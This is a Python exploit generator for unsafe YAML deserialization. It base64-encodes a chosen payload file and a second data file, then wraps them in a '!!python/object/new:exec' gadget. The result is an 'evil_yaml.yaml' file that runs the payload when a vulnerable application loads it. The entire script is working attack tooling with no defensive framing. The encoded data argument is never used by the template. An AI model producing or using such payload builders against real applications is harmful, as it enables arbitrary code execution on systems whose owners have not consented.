#!/usr/bin/python3
from base64 import b64encode
from sys import argv

YAML_TEMPLATE = """!!python/object/new:exec """ 											+ \
""" [ "payload_b64 = b'{0}'; external_data_b64 = b'{1}'; """ 								+ \
"""    from base64 import b64decode; payload = b64decode(payload_b64).decode('utf8'); """ 	+ \
"""    exec(payload)" ]"""


def main(argv):
    if len(argv) != 3:
        print("[+] Usage: {} <payload-path> <new-runtime-path>".format(argv[0]))
        return
    
    payload_path = argv[1]
    data_path = argv[2]
    yaml = create_yaml(payload_path, data_path)


def create_yaml(payload_path, data_path):
    print(f"[+] Creating evil yaml with payload '{payload_path}' and data '{data_path}'")

    try:
        payload = readfile(payload_path, "rb")
        data = readfile(data_path, "rb")
    except FileNotFoundError as err:
        print(f"{err}")
        return "Failed"
    
    enc_payload = str(b64encode(payload), "utf-8")
    enc_data = str(b64encode(data), "utf-8")
 
    evil_yaml = YAML_TEMPLATE.format(enc_payload, enc_data)

    with open("evil_yaml.yaml", "w+") as f:
        f.write(evil_yaml)

    print("Created file 'evil_yaml.yaml' with given data")


def readfile(path, mode):
    with open(path, mode) as f:
        data = f.read()
    return data


if __name__ == "__main__":
	main(argv)
